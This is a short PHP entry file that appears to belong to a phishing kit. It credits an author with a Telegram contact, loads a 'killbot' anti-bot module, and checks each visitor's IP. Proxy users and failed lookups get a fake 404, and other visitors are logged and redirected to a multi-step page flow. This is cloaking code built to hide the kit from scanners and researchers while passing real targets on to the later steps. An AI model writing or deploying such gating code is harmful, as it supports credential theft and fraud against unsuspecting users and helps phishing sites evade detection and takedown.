<?php
include "killbot/code/include.php";
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    require_once 'app/config.php';

    $ip_infos = get_ip_infos(get_client_ip());
    $_SESSION['currency'] = $ip_infos['currency'];

    if( $ip_infos['status'] == "success" ) {

        if( $ip_infos['proxy'] == true ) {
            header('HTTP/1.0 404 Not Found');
            exit();
        }

        visitors();
        header("Location: step1.php?id=" . mt_rand(11111, 99999999));
        exit();

    } else {
        header('HTTP/1.0 404 Not Found');
        exit();
    }

?>